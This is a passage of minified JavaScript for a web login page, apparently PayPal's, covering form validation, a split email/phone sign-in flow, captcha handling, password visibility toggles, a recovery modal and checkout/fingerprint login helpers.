                                updateView: f,
                                isInIframe: m,
                                isInContextIntegration: E,
                                getSplitLoginContext: g,
                                getIntent: y,
                                getFlowId: b,
                                getKmliCb: w,
                                getActiveCaptchaElement: S,
                                getCaptchaDom: T,
                                getQueryParamFromUrl: x,
                                setSliderToPasswordContainer: C
                            }
                        }(),
                        function() {
                            var e = function(e) {
                                function t(t) {
                                    return e.classList ? e.classList.contains(t) : !!e.className.match(new RegExp("(\\s|^)" + t + "(\\s|$)"))
                                }

                                function n(n) {
                                    e.classList ? e.classList.add(n) : t(n) || (e.className += " " + n)
                                }

                                function r(n) {
                                    if (e.classList) e.classList.remove(n);
                                    else if (t(n)) {
                                        var r = new RegExp("(\\s|^)" + n + "(\\s|$)");
                                        e.className = e.className.replace(r, " ")
                                    }
                                }

                                function i(t) {
                                    var n;
                                    if (typeof t != "string") return;
                                    return n = "data-" + t.replace(/([A-Z])/g, "-$1").toLowerCase(), e.getAttribute(n)
                                }

                                function s() {
                                    var t, n = e.offsetHeight;
                                    return typeof getComputedStyle == "undefined" ? n : (t = getComputedStyle(e), n += parseInt(t.marginTop) + parseInt(t.marginBottom), n)
                                }

                                function o(t, n) {
                                    return n ? e.setAttribute(t, n) : e.getAttribute(t)
                                }

                                function u(t) {
                                    return e.querySelectorAll(t)
                                }

                                function a(t) {
                                    e.textContent !== undefined && e.textContent !== null ? e.textContent = t : e.innerText = t
                                }

                                function f() {
                                    e.parentNode.removeChild(e)
                                }

                                function l() {
                                    t("hide") ? r("hide") : n("hide")
                                }

                                function c(t) {
                                    e.appendChild(t)
                                }

                                function h() {
                                    e.focus()
                                }

                                function p(t) {
                                    e.value = t
                                }
                                typeof e == "string" && (e = document.querySelector(e));
                                if (!e) return;
                                return {
                                    hasClass: t,
                                    addClass: n,
                                    removeClass: r,
                                    data: i,
                                    outerHeight: s,
                                    text: a,
                                    attr: o,
                                    find: u,
                                    remove: f,
                                    toggle: l,
                                    append: c,
                                    focus: h,
                                    val: p
                                }
                            };
                            e.ajax = function(e) {
                                var t, n, r, i = [],
                                    s;
                                if (!e || e && !e.url) return;
                                try {
                                    t = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP")
                                } catch (o) {}
                                if (!t) return;
                                e.method = e.method || "POST";
                                if (e.data && typeof e.data != "string")
                                    for (s in e.data) i.push(encodeURIComponent(s) + "=" + encodeURIComponent(e.data[s]));
                                t.onreadystatechange = function() {
                                    if (t.readyState !== 4) return;
                                    n = t.response || t.responseText;
                                    if (t.status === 200 && n) {
                                        try {
                                            n = JSON.parse(n)
                                        } catch (r) {}
                                        typeof e.success == "function" && e.success(n)
                                    }
                                    t.status !== 200 && typeof e.fail == "function" && e.fail(t), typeof e.complete == "function" && e.complete()
                                }, t.open(e.method, e.url), t.setRequestHeader("X-Requested-With", "XMLHttpRequest"), e.method === "POST" && (t.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), t.setRequestHeader("Accept", "application/json")), e.method === "GET" && t.setRequestHeader("Accept", "application/json");
                                if (typeof e.headers == "object" && e.headers.length)
                                    for (r in e.headers) t.setRequestHeader(r, e.headers[r]);
                                return t.send(i && i.join("&")), t
                            }, window.$ = e
                        }(),
                        function() {
                            typeof Object.assign != "function" && (Object.assign = function(e, t) {
                                if (e === null) throw new TypeError("Cannot convert undefined or null to object");
                                var n = Object(e);
                                for (var r = 1; r < arguments.length; r++) {
                                    var i = arguments[r];
                                    if (i !== null)
                                        for (var s in i) Object.prototype.hasOwnProperty.call(i, s) && (n[s] = i[s])
                                }
                                return n
                            }), String.prototype.trim || (String.prototype.trim = function() {
                                return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "")
                            })
                        }(), login.fn = function() {
                            function t(t) {
                                var n = document.getElementById("fconfig");
                                n && n.parentNode && n.parentNode.removeChild(n), n = document.createElement("script"), n.id = "fconfig", n.type = "application/json", n.setAttribute("fncls", e), n.text = '{"f":"' + t.fnSessionId + '","s":"' + t.sourceId + '","b":"' + t.beaconUrl + '"}', document.body.appendChild(n)
                            }

                            function n(e) {
                                var t = document.createElement("script");
                                t.src = e.fnUrl, t.onload = function() {
                                    r(e)
                                }, document.body.appendChild(t)
                            }

                            function r(e) {
                                e.enableSpeedTyping && typeof initTsFb == "function" && initTsFb({
                                    detail: {
                                        type: "UL",
                                        fields: ["email", "password"]
                                    }
                                })
                            }

                            function i(e) {
                                PAYPAL.syncData && typeof PAYPAL.syncData.initSync == "function" && e && PAYPAL.syncData.initSync(e)
                            }

                            function s() {
                                if (PAYPAL.syncData && typeof PAYPAL.syncData.flushData == "function") try {
                                    PAYPAL.syncData.flushData()
                                } catch (e) {}
                            }

                            function o(e) {
                                e && e.sourceId && typeof PAYPAL.ulSync == "object" && (PAYPAL.ulSync.sourceId = e.sourceId, i(PAYPAL.ulSync))
                            }

                            function u() {
                                var e = $("body").data("enableFnBeaconOnWebViews");
                                return !e && /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(window.navigator.userAgent) ? !1 : !0
                            }

                            function a() {
                                u() && PAYPAL && PAYPAL.ulData && (t(PAYPAL.ulData), n(PAYPAL.ulData)), i(PAYPAL.ulSync)
                            }
                            var e = "fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99";
                            return {
                                initialize: a,
                                initializeFnSync: i,
                                addFnSyncData: s,
                                updateFnSyncContext: o
                            }
                        }(), login.core = function() {
                            return function() {
                                function D(e) {
                                    if (!e || typeof e != "string") return;
                                    return e.replace(N, "")
                                }

                                function P(e) {
                                    return D(e.field.value) ? !0 : (I(e), q(e), !1)
                                }

                                function H(e) {
                                    var t = e && e.field && e.field.value;
                                    return !e || !e.field || e.field.hasAttribute("disabled") ? !0 : t ? (t = t && t.replace(L, ""), !t || t.match(k) ? (I(e), R(e), !1) : !0) : (I(e), q(e), !1)
                                }

                                function B(e, t) {
                                    var n, r, i = !0,
                                        s = login.utils.getActiveCaptchaElement(a);
                                    return n = P(e), n ? (r = P(t), r ? (s && s.field && (i = P(s)), i ? !0 : !1) : !1) : !1
                                }

                                function j(e) {
                                    if (e.value === "inputEmail") return document.querySelector("#rememberProfileEmail");
                                    if (e.value === "inputPassword") return document.querySelector("#rememberProfilePassword");
                                    if (e.value === "implicitEmail") return document.querySelector("#rememberProfileImplicit");
                                    return
                                }

                                function F(e) {
                                    var t = e.field.value.replace(N, "");
                                    return !t.match(C) && !e.field.hasAttribute("disabled") ? (I(e), R(e), !1) : !0
                                }

                                function I(e) {
                                    $(e.container).addClass("hasError"), e.container.style["z-index"] = 100, $(e.errMsgContainer).addClass("show"), e.field.focus()
                                }

                                function q(e) {
                                    $(e.errMsg).removeClass("hide")
                                }

                                function R(e) {
                                    $(e.invalidMsg).removeClass("hide")
                                }

                                function U(e, t) {
                                    t && $(e.container).removeClass("hasError"), e.container.style["z-index"] = 1, $(e.errMsgContainer).removeClass("show")
                                }

                                function z(e) {
                                    $(e.errMsg).addClass("hide")
                                }

                                function W(e) {
                                    $(e.invalidMsg).addClass("hide")
                                }

                                function X() {
                                    var e = document.querySelector('input[name="splitLoginContext"]');
                                    $(h).removeClass("hide"), $(p).addClass("hide"), r.field && r.field.removeAttribute("disabled"), i.field && i.field.removeAttribute("disabled"), s.field && s.field.setAttribute("disabled", "disabled"), o.field && o.field.setAttribute("disabled", "disabled"), u.field && u.field.setAttribute("disabled", "disabled"), M || $(w).removeClass("hide"), y && $(y).addClass("hide"), $(c).removeClass("phonePresent"), A = "email", e && (e.value = "inputEmail")
                                }

                                function V() {
                                    var e = document.querySelector('input[name="splitLoginContext"]');
                                    $(p).removeClass("hide"), $(h).addClass("hide"), s.field && s.field.removeAttribute("disabled"), o.field && o.field.removeAttribute("disabled"), u.field && u.field.removeAttribute("disabled"), r.field && r.field.setAttribute("disabled", "disabled"), i.field && i.field.setAttribute("disabled", "disabled"), $(w).addClass("hide"), $(c).addClass("phonePresent"), m && $(m).addClass("hide"), A = "phone", e && !M && (e.value = "inputPhone")
                                }

                                function J() {
                                    function i() {
                                        var e = n.options[n.selectedIndex].value,
                                            t = e.split(" ");
                                        return {
                                            countryCode: t && (t[0] || ""),
                                            phoneCode: t && (t[1] || "")
                                        }
                                    }
                                    var e = s.container.querySelector(".countryCode"),
                                        t = s.container.querySelector(".phoneCode"),
                                        n = s.field,
                                        r;
                                    r = i(), $(e).text(r.countryCode), $(t).text(r.phoneCode)
                                }

                                function K(e) {
                                    e.preventDefault();
                                    var t = document.querySelector('input[name="splitLoginContext"]'),
                                        n = document.querySelector("#splitPhoneSection .forgotIcon");
                                    $(p).removeClass("hide"), $(h).addClass("hide"), $(m).addClass("hide"), $(y).removeClass("hide"), U(r, !0), s.field && s.field.removeAttribute("disabled"), o.field && o.field.removeAttribute("disabled"), r.field && r.field.setAttribute("disabled", "disabled"), _ ? (u.field && u.field.removeAttribute("disabled"), i.field && i.field.setAttribute("disabled", "disabled"), A = "phone", $(c).addClass("phonePresent"), $(w).addClass("hide"), n && $(n).addClass("hide"), t.value = "inputPhone") : (i.field && i.field.removeAttribute("disabled"), u.field && u.field.setAttribute("disabled", "disabled"), A = "phonePassword")
                                }

                                function Q(e) {
                                    e.preventDefault();
                                    var t = document.querySelector('input[name="splitLoginContext"]');
                                    $(h).removeClass("hide"), $(p).addClass("hide"), $(y).addClass("hide"), $(m).removeClass("hide"), U(o, !0), r.field && r.field.removeAttribute("disabled"), i.field && i.field.removeAttribute("disabled"), s.field && s.field.setAttribute("disabled", "disabled"), o.field && o.field.setAttribute("disabled", "disabled"), u.field && u.field.setAttribute("disabled", "disabled"), $(c).removeClass("phonePresent"), A = "email", t.value = "inputEmail"
                                }

                                function G(e) {
                                    var t = document.querySelector("input[name=splitLoginContext]"),
                                        n = document.querySelector("input[name=splitLoginCookiedFallback]"),
                                        r = t && t.value || "";
                                    n ? Z(e) : r === "inputEmail" || r === "inputPhone" || r === "implicitEmail" ? Y(e) : Z(e)
                                }

                                function Y(e) {
                                    var i = A === "email" ? P(r) : H(o),
                                        s = document.querySelectorAll("form[name=login] input"),
                                        u = {},
                                        f = login.utils.getActiveCaptchaElement(a),
                                        l = j(a),
                                        c = $("body").data("splitPasswordClientTransition"),
                                        h, p, d, v, m = window.PAYPAL && window.PAYPAL.analytics,
                                        g = w && w.querySelector(".pwrLink");
                                    O = !0, eventPreventDefault(e), i && $(r.field).hasClass("validate") && (i = F(r)), i && f && f.field && (i = P(f));
                                    if (!i) return;
                                    login.utils.showSpinner(), login.fn.addFnSyncData(), A === "phonePassword" && g && g.setAttribute("href", g.getAttribute("href") + "&passwordRecoveryByPhoneEnabled=true"), t && $(t).text(""), m && m.startCPLTracking && m.startCPLTracking();
                                    if (A === "phone" || A === "phonePassword") {
                                        h = document.querySelector("#phone"), p = document.querySelector("#phoneCode"), login.storeInstance.updateModel({
                                            splitLoginContext: _ ? "inputPin" : "inputPassword",
                                            profile: {
                                                phone: h && h.value.replace(L, ""),
                                                phoneCode: p && p.value.replace(/[A-Z\s]/ig, "")
                                            }
                                        }), login.utils.hideSpinner(), login.utils.setSliderToPasswordContainer();
                                        return
                                    }
                                    if (c && A === "email") {
                                        login.storeInstance.updateModel({
                                            splitLoginContext: "inputPassword",
                                            profile: {
                                                email: r && r.field && r.field.value
                                            },
                                            rememberProfile: l && l.checked
                                        }), login.utils.hideSpinner(), m && m.endCPLTracking && (d = {
                                            pgrp: "main:unifiedlogin:splitlogin::pwd",
                                            page: "main:unifiedlogin:splitlogin::pwd:::"
                                        }, m.endCPLTracking({
                                            pageData: d
                                        })), login.utils.setSliderToPasswordContainer();
                                        return
                                    }
                                    for (var y = 0; y < s.length; y++) u[s[y].name] = s[y].value;
                                    u.splitLoginContext !== "inputPassword" && delete u.login_password, f && f.field && (u.captcha = f.field.value), l && (u.rememberProfile = l.checked), v = getEventTarget(e), v && v.id === "btnTryPasswordless" && (u.splitLoginContext = "tryWithEmail"), $.ajax({
                                        url: n.getAttribute("action"),
                                        data: u,
                                        success: login.utils.successfulXhrHandler,
                                        fail: login.utils.failedXhrSubmitHandler
                                    })
                                }

                                function Z(e) {
                                    var t, n, s, a = document.querySelector(".profileRememberedEmail");
                                    O = !0, t = B(r, i), !a && s && $(r.field).hasClass("validate") && (t = F(r)), o.field && (n = u.field && B(o, u) || i.field && B(o, i)), s = t || n, s ? (login.utils.showSpinner(), login.utils.showSpinnerMessage(), login.fn.addFnSyncData(), setTimeout(function() {
                                        l.setAttribute("disabled", "disabled")
                                    }, 10)) : eventPreventDefault(e)
                                }

                                function et(e) {
                                    var t;
                                    if (!O) return !1;
                                    t = e.field.value.replace(N, "");
                                    if (t === "") {
                                        q(e), e.type === "email" && W(e);
                                        return
                                    }
                                    z(e), e.type === "email" && $(e.field).hasClass("validate") ? t.match(C) ? (W(e), U(e, !0)) : (I(e), R(e)) : U(e, !0)
                                }

                                function tt(e) {
                                    O = !1, U(e)
                                }

                                function nt(e) {
                                    $(e.container).hasClass("hasError") ? O = !0 : O = !1
                                }

                                function rt() {
                                    return o.field && (r.field && r.field.hasAttribute("disabled") || a && a.value === "inputPhone") ? _ ? "phone" : "phonePassword" : "email"
                                }

                                function it(e) {
                                    var t = login.utils.getActiveCaptchaElement(a),
                                        n = t.audioTag,
                                        r = !!n.canPlayType && !!n.canPlayType("audio/mpeg").replace(/no/, "");
                                    if (!r) return !0;
                                    eventPreventDefault(e), t.field.focus(), n.play()
                                }

                                function st(e) {
                                    var t = login.utils.getActiveCaptchaElement(a);
                                    eventPreventDefault(e), eventStopPropagation(e), $.ajax({
                                        type: "POST",
                                        url: "/signin/refreshCaptcha",
                                        data: {
                                            _csrf: document.querySelector("#token").value
                                        },
                                        dataType: "json",
                                        success: function(e) {
                                            e && e.captcha && (t.image.setAttribute("src", e.captcha.captchaImgUrl), t.audioTag.setAttribute("src", e.captcha.captchaAudioUrl), t.playAudioBtn.setAttribute("href", e.captcha.captchaAudioUrl), t.field.value = "", $("body").hasClass("desktop") && t.field.focus())
                                        }
                                    })
                                }

                                function ot(e) {
                                    var t = getEventTarget(e);
                                    if (!t) return;
                                    setTimeout(function() {
                                        $(t).hasClass("scTrack:unifiedlogin-rememberme-profile-opt-in") ? ($(t).removeClass("scTrack:unifiedlogin-rememberme-profile-opt-in"), $(t).addClass("scTrack:unifiedlogin-rememberme-profile-opt-out")) : ($(t).removeClass("scTrack:unifiedlogin-rememberme-profile-opt-out"), $(t).addClass("scTrack:unifiedlogin-rememberme-profile-opt-in"))
                                    }, 10)
                                }

                                function ut() {
                                    function n(e) {
                                        e.playAudioBtn.onclick = it, e.refreshCaptchaBtn.onclick = st, e.field.onkeyup = et.bind(null, e), e.field.onblur = tt.bind(null, e), e.field.onfocus = nt.bind(null, e)
                                    }
                                    var e = document.querySelectorAll(".captcha-container");
                                    for (var t = 0; t < e.length; t++) n(login.utils.getCaptchaDom(e[t]))
                                }

                                function at(e) {
                                    var t = getEventTarget(e),
                                        r, i, s;
                                    if (!t || t.id !== "iconCloseEducation") return;
                                    r = document.querySelector(".educationMessage");
                                    if (!r) return;
                                    i = document.querySelector(".contentContainer"), $(r).addClass("hide"), i && $(i).removeClass("contentContainerShort"), s = document.createElement("input"), s.setAttribute("type", "hidden"), s.setAttribute("name", "removeEducationMsg"), s.setAttribute("value", "true"), $(n).append(s)
                                }

                                function ft() {
                                    var e = document.querySelector("#splitLoginOptOut");
                                    e && addEvent(e, "click", login.utils.getOutboundLinksHandler(e, null, "process_split_login_opt_out"))
                                }
                                var t = document.querySelector("#notifications"),
                                    n = document.querySelector("form[name=login]"),
                                    r = {
                                        container: document.querySelector("#login_emaildiv"),
                                        field: document.querySelector("#email"),
                                        errMsgContainer: document.querySelector("#emailErrorMessage"),
                                        errMsg: document.querySelector("#emailErrorMessage .emptyError"),
                                        invalidMsg: document.querySelector("#emailErrorMessage .invalidError"),
                                        phoneEmailToggleIcon: document.querySelector("#login_emaildiv .icon"),
                                        type: "email"
                                    },
                                    i = {
                                        container: document.querySelector("#login_passworddiv"),
                                        field: document.querySelector("#password"),
                                        errMsgContainer: document.querySelector("#passwordErrorMessage"),
                                        errMsg: document.querySelector("#passwordErrorMessage .emptyError")
                                    },
                                    s = {
                                        container: document.querySelector("#pinSection") || document.querySelector("#splitPhoneSection"),
                                        field: document.querySelector("#phoneCode")
                                    },
                                    o = {
                                        container: document.querySelector("#login_phonediv"),
                                        field: document.querySelector("#phone"),
                                        errMsgContainer: document.querySelector("#phoneErrorMessage"),
                                        errMsg: document.querySelector("#phoneErrorMessage .emptyError"),
                                        invalidMsg: document.querySelector("#phoneErrorMessage .invalidError")
                                    },
                                    u = {
                                        container: document.querySelector("#login_pindiv"),
                                        field: document.querySelector("#pin"),
                                        errMsgContainer: document.querySelector("#pinErrorMessage"),
                                        errMsg: document.querySelector("#pinErrorMessage .emptyError")
                                    },
                                    a = document.querySelector("input[name=splitLoginContext]"),
                                    f = document.querySelector("#btnNext"),
                                    l = document.querySelector("#btnLogin"),
                                    c = document.querySelector(".actions"),
                                    h = document.querySelector("#splitEmailSection") || document.querySelector("#passwordSection"),
                                    p = document.querySelector("#splitPhoneSection") || document.querySelector("#pinSection"),
                                    d = document.querySelector(".email"),
                                    v = document.querySelector(".phone"),
                                    m = document.querySelector("#loginWithPhoneOption"),
                                    g = document.querySelector("#switchToPhone"),
                                    y = document.querySelector("#loginWithEmailOption"),
                                    b = document.querySelector("#switchToEmail"),
                                    w = document.querySelector(".forgotLink"),
                                    E = document.querySelector("#createAccount");
                                E && (E.onclick = function(e) {
                                    var t = login.logger.getStateName();
                                    login.utils.getOutboundLinksHandler(E, t, "process_signup")(e)
                                });
                                var S = document.querySelector("#backToInputEmailLink"),
                                    x = document.querySelector("#btnTryPasswordless"),
                                    T = document.querySelector("#rememberProfileEmail"),
                                    N = /^\s+|\s+$/,
                                    C = /^\S+@\S+\.\S+$/,
                                    k = /[^\d]+/g,
                                    L = /[-().\s]/ig,
                                    A = rt(),
                                    O = !1,
                                    M = $("body").data("phonePasswordEnabled"),
                                    _ = $("body").data("phonePinEnabled");
                                r.field && (r.field.onkeyup = et.bind(null, r), r.field.onblur = tt.bind(null, r), r.field.onfocus = nt.bind(null, r)), i.field && (i.field.onkeyup = et.bind(null, i), i.field.onblur = tt.bind(null, i), i.field.onfocus = nt.bind(null, i)), o.field && (o.field.onkeyup = et.bind(null, o), o.field.onblur = tt.bind(null, o), o.field.onfocus = nt.bind(null, o)), u.field && (u.field.onkeyup = et.bind(null, u), u.field.onblur = tt.bind(null, u), u.field.onfocus = nt.bind(null, u)), s && s.field && (s.field.onchange = J), ut(), ft(), d && v && (d.onclick = X, v.onclick = V), M && g && (g.onclick = K), M && b && (b.onclick = Q), addEvent(n, "submit", G), x && (x.onclick = Y), S && addEvent(S, "click", function(e) {
                                    A = "email", login.utils.notYouClickHandler(e), r.container && U(r, !0), i.container && U(i, !0), o.container && U(o, !0), u.container && U(u, !0)
                                }), T && (T.onclick = ot), login.pubsub && login.pubsub.subscribe("WINDOW_CLICK", at)
                            }
                        }(), login.showHidePassword = function() {
                            function e(e, t) {
                                function s() {
                                    $(n).addClass("hide"), $(r).addClass("hide")
                                }

                                function o(e) {
                                    t === "tel" ? $(i).removeClass("tel-password") : i.setAttribute("type", t), $(n).addClass("hide"), $(r).removeClass("hide"), i.focus(), e.stopPropagation(), login.logger.log({
                                        evt: "is_pwd_sh",
                                        data: "Y",
                                        instrument: !0
                                    }), login.logger.pushLogs()
                                }

                                function u(e) {
                                    t === "tel" ? $(i).addClass("tel-password") : i.setAttribute("type", "password"), $(n).removeClass("hide"), $(r).addClass("hide"), i.focus(), e.stopPropagation(), login.logger.log({
                                        evt: "is_pwd_sh",
                                        data: "N",
                                        instrument: !0
                                    }), login.logger.pushLogs()
                                }

                                function a(e) {
                                    s();
                                    if (login.utils.isFieldPrefilled(i) || i.value.length > 0) t === "text" ? i.getAttribute("type") === "password" ? $(n).removeClass("hide") : $(r).removeClass("hide") : $(i).hasClass("tel-password") ? $(n).removeClass("hide") : $(r).removeClass("hide");
                                    e.stopPropagation()
                                }
                                var n = e.querySelector(".showPassword"),
                                    r = e.querySelector(".hidePassword"),
                                    i = e.querySelector(".pin-password");
                                t = t || "text", t === "tel" && $(i).addClass("tel-password"), n.onclick = o, r.onclick = u, i.onfocus = a, addEvent(i, "keyup", a), i.onclick = function(e) {
                                    e.stopPropagation()
                                }, window.onclick = s
                            }
                            return function() {
                                var n = $(document.body).data("showHidePassword"),
                                    r = document.querySelector("#signUpSection"),
                                    i = document.querySelector("#passwordSection"),
                                    s = document.querySelector("#pinSection") || document.querySelector("#splitPinSection"),
                                    o;
                                s && (o = s.querySelector(".pin-password"));
                                if (!n) {
                                    o && $(o).addClass("tel-password");
                                    return
                                }
                                r && e(r), i && e(i), s && o && e(s, o.getAttribute("type") === "tel" ? "tel" : "text")
                            }
                        }(), login.oneTouch = function() {
                            return function() {
                                var t = document.querySelector(".keepMeLoginAbout"),
                                    n = document.getElementById("keepMeLoginTerms"),
                                    r = login.utils.getKmliCb(),
                                    i = "scTrack:unifiedlogin-rememberme-about-open",
                                    s = "scTrack:unifiedlogin-rememberme-about-close",
                                    o = "scTrack:unifiedlogin-rememberme-opt-in",
                                    u = "scTrack:unifiedlogin-rememberme-opt-out";
                                if (!r || !t || !n) return;
                                t.setAttribute("href", "#"), t.onclick = function() {
                                    $(n).hasClass("slideUp") ? ($(n).removeClass("slideUp"), $(n).addClass("slideDown"), setTimeout(function() {
                                        $(t).removeClass(i), $(t).addClass(s)
                                    }, 10)) : ($(n).removeClass("slideDown"), $(n).addClass("slideUp"), setTimeout(function() {
                                        $(t).removeClass(s), $(t).addClass(i)
                                    }, 10)), t.focus(), setTimeout(function() {
                                        window.dispatchEvent && window.dispatchEvent(createNewEvent("resize"))
                                    }, 200)
                                }, r.onclick = function() {
                                    setTimeout(function() {
                                        $(r).hasClass(o) ? ($(r).removeClass(o), $(r).addClass(u)) : ($(r).removeClass(u), $(r).addClass(o))
                                    }, 10)
                                }
                            }
                        }(), login.footer = function() {
                            function n() {
                                var e = document.querySelector(".footer"),
                                    t = document.querySelector(".activeContent"),
                                    n = document.querySelector("#returnToMerchant"),
                                    r, i, s = n && $(n).outerHeight() || 0;
                                r = $(t).outerHeight() + $(e).outerHeight() + s, i = window.innerHeight || document.documentElement && document.documentElement.clientHeight || window.screen && window.screen.height || document.height || document.body && document.body.offsetHeight, i < r ? $(e).addClass("footerStayPut") : $(e).removeClass("footerStayPut")
                            }
                            var e = document.querySelectorAll(".localeSelector li a");
                            for (var t = 0; t < e.length; t++) e[t].onclick = login.utils.getOutboundLinksHandler(e[t], null, "process_language_change");
                            return function() {
                                n(), addEvent(window, "resize", n)
                            }
                        }(), login.pwr = function() {
                            return function() {
                                function o(e) {
                                    e.preventDefault(), s = document.createElement("div"), s.className = "modal-underlay", document.body.appendChild(s), n.style.display = "block", setTimeout(function() {
                                        s.style.opacity = .7, n.style.opacity = 1
                                    }, 0), r.setAttribute("src", $(r).data("src")), r.focus(), r.onload = function() {
                                        a(), r.focus()
                                    }, login.logger.log({
                                        evt: "state_name",
                                        data: login.logger.getStateName(),
                                        instrument: !0
                                    }), login.logger.log({
                                        evt: "transition_name",
                                        data: "process_password_recovery",
                                        instrument: !0
                                    }), login.logger.pushLogs()
                                }

                                function u() {
                                    var e = document.querySelector(".modal-underlay");
                                    document.body.removeChild(e), n.style.display = "none", r.setAttribute("src", "about:blank"), t.focus()
                                }

                                function a() {
                                    var e = window.innerHeight || document.documentElement.clientHeight;
                                    e <= n.clientHeight ? (n.style.transform = "translate(-50%, 0%)", n.style.top = 0) : (n.style.transform = "translate(-50%, -50%)", n.style.top = "50%")
                                }
                                var t = document.querySelector("#forgotPasswordModal"),
                                    n = document.getElementById("password-recovery-modal"),
                                    r = document.getElementById("pwdIframe"),
                                    i, s;
                                r && login.utils.isInIframe() && r.setAttribute("target", "_blank"), t && !login.utils.isInIframe() && (i = document.createElement("button"), i.className = "ui-dialog-titlebar-close", i.setAttribute("type", "button"), n.appendChild(i), t.onclick = o, i.onclick = u, addEvent(r, "focusout", function(e) {
                                    e.preventDefault(), i.focus()
                                }), i.onkeydown = function(e) {
                                    e.which === 9 && r.focus()
                                }, addEvent(window, "resize", a))
                            }
                        }(), login.ads = function() {
                            function init(e) {
                                var t, n = e || $("body").data("adsChallengeUrl");
                                $.ajax({
                                    url: n,
                                    method: "GET",
                                    success: function(e) {
                                        t = document.createElement("script"), t.id = "ads", t.type = "text/javascript", t.text = e.replace(/<\/?(html|body|script)>/g, ""), document.body.appendChild(t)
                                    },
                                    fail: function(e) {}
                                })
                            }

                            function handleAdsInterception(htmlResponse) {
                                var isAutoSubmit = !0,
                                    adsContainerId = "ads-container",
                                    adsContainerDiv, scriptNodes, adsCaptchaType;
                                document.getElementById("ads-container") && document.getElementById("ads-container").parentNode.removeChild(document.getElementById("ads-container")), adsContainerDiv = document.createElement("div"), adsContainerDiv.setAttribute("id", adsContainerId), adsContainerDiv.innerHTML = htmlResponse, $("#main").append(adsContainerDiv), scriptNodes = adsContainerDiv.getElementsByTagName("script");
                                for (var i = 0; i < scriptNodes.length; i++) eval.call(this, scriptNodes[i].innerHTML);
                                typeof autosubmit != "undefined" && (isAutoSubmit = autosubmit), typeof captchatype != "undefined" && (adsCaptchaType = captchatype), isAutoSubmit ? document.getElementById("ads-container").style.display = "none" : $("#login").addClass("hide"), typeof login.authCaptcha == "function" && login.authCaptcha(isAutoSubmit), isAutoSubmit || (login.utils.hideSpinner(), login.utils.hideSpinnerMessage()), login.logger.log({
                                    evt: "ads_state_name",
                                    data: isAutoSubmit ? "pre_jschallenge_served" : adsCaptchaType,
                                    instrument: !0
                                }), login.logger.pushLogs()
                            }
                            return {
                                init: init,
                                handleAdsInterception: handleAdsInterception
                            }
                        }(), login.checkoutIncontext = function() {
                            function r(e, t) {
                                var n;
                                if (!e) return "";
                                n = e.match(t);
                                if (n) return n[1]
                            }

                            function i(e) {
                                var t = window.name.split("__")[2].replace(/_/g, ".");
                                return e && e.version ? n.replace("checkout.js", "checkout." + e.version + ".js") : t.match(/^[0-9a-zA-Z\.]+$/) && t !== "4" && t !== "latest" ? n.replace("checkout.js", "checkout." + t + ".js") : n
                            }

                            function s() {
                                var t, n, i;
                                window.xchild && (window.paypalCheckout = window.xchild), t = e && e.targetCancelUrl, n = e && e.paymentToken, i = e && e.merchantID;
                                if (window.xprops && window.xprops.init && t) return window.xprops.init({
                                    paymentToken: n || r(t, /token=((EC-)?[A-Z0-9]+)/),
                                    merchantID: i,
                                    cancelUrl: t
                                })
                            }

                            function o() {
                                var t = e,
                                    n = document.createElement("script");
                                return n.setAttribute("src", i(t)), n.setAttribute("onerror", "scripterror(event)"), n.setAttribute("data-no-bridge", t && t.noBridge ? t.noBridge : ""), n.setAttribute("data-state", "ppxo_checkout"), n.setAttribute("data-env", t && t.env ? t.env : ""), t && t.icstage && n.setAttribute("data-stage", t.icstage), n.onload = function() {
                                    s()
                                }, n
                            }

                            function u() {
                                var n, i, s, o;
                                return function() {
                                    if (t && window.xchild) return s = t.getAttribute("href"), o = e && e.paymentAction, i = {
                                        paymentToken: r(s, /token=((EC-)?[A-Z0-9]+)/),
                                        billingToken: r(s, /ba_token=((BA-)?[A-Z0-9]+)/),
                                        payerID: r(s, /PayerID=([A-Z0-9]+)/),
                                        paymentID: r(s, /paymentId=((PAY-)?[A-Z0-9]+)/),
                                        intent: o || ""
                                    }, n = e && e.targetCancelUrl, window.xprops && window.xprops.onCancel && n ? (i.cancelUrl = n, window.xprops.onCancel(i)) : window.xchild.close()
                                }
                            }
                            var e = PAYPAL && PAYPAL.ulData && PAYPAL.ulData.incontextData,
                                t = document.querySelector("#cancelLink"),
                                n = "https://www.paypalobjects.com/api/checkout.js";
                            return function() {
                                login.utils.isInContextIntegration() ? (document.body.appendChild(o()), t && (t.onclick = login.utils.getOutboundLinksHandler(t, null, "process_cancel_and_return_to_merchant", u()))) : t && (t.onclick = login.utils.getOutboundLinksHandler(t, null, "process_cancel_and_return_to_merchant"))
                            }
                        }(), fingerprint = fingerprint || {}, fingerprint.utils = function() {
                            function t() {
                                var e = document.getElementById("token");
                                return e && e.value || ""
                            }

                            function n(e) {
                                var t = document.getElementById("token");
                                t && e && (t.value = e)
                            }

                            function r(r, i, s) {
                                var o = {};
                                r = r || {}, r.data && (o = r.data), o._csrf = t(), e.showSpinner(), e.showSpinnerMessage("oneSecond"), $.ajax({
                                    type: r.method || "POST",
                                    url: "/signin" + (r.path || ""),
                                    data: o,
                                    dataType: "json",
                                    success: function(e) {
                                        return n(e && e._csrf), i(e)
                                    },
                                    fail: s
                                })
                            }

                            function i(e, t) {
                                e && navigator.uaf.processUAFOperation(e, function(e) {
                                    if (typeof t == "function") return t()
                                }, function(e) {
                                    if (typeof t == "function") return t()
                                })
                            }

                            function s(e) {
                                e && navigator.uaf.processUAFOperation(e, function(e) {}, function(e) {})
                            }

                            function o(e) {
                                if (e) return {
                                    uafProtocolMessage: e,
                                    additionalData: null
                                }
                            }
                            var e = login.utils;
                            return {
                                makeServiceRequest: r,
                                getUafMessage: o,
                                cancelUafOperation: i,
                                deregisterUAFOperation: s
                            }
                        }();
                    var fingerprint = fingerprint || {};
                    fingerprint.login = function() {
                        function c(e) {
                            var n = e && e.getAttribute("href"),
                                r = document.querySelector("form[name=login] input[name=fpPromptWithError]");
                            t.showSpinner(), n ? window.location.href = n : window.location.href = r && r.value || window.location.href + "&fpPrompt=login"
                        }

                        function h() {
                            var e = document.querySelector("#fpLoginNotYouLink");
                            e && (e.onclick = function(n) {
